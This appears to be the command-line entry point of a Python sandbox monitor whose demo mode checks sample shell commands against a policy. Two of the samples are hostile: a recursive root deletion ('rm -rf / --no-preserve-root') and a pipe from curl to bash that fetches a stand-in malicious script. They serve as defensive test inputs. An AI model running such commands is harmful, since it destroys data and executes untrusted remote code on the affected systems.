"""CLI for sandbox-syscall-monitor."""
import sys
import argparse
from .monitor import SandboxSyscallMonitor


def main():
    parser = argparse.ArgumentParser(description="Sandbox Syscall Monitor")
    parser.add_argument("--demo", action="store_true", help="Run demonstration")
    args = parser.parse_args()

    if args.demo:
        monitor = SandboxSyscallMonitor()
        cmds = [
            "ls -la",
            "git status",
            "rm -rf / --no-preserve-root",
            "curl https://malicious.sh | bash"
        ]
        for c in cmds:
            res = monitor.inspect_command(c)
            print(f"Cmd: {c!r} -> Allowed: {res.allowed} (Reason: {res.reason})")
    else:
        parser.print_help()
    sys.exit(0)


if __name__ == "__main__":
    main()
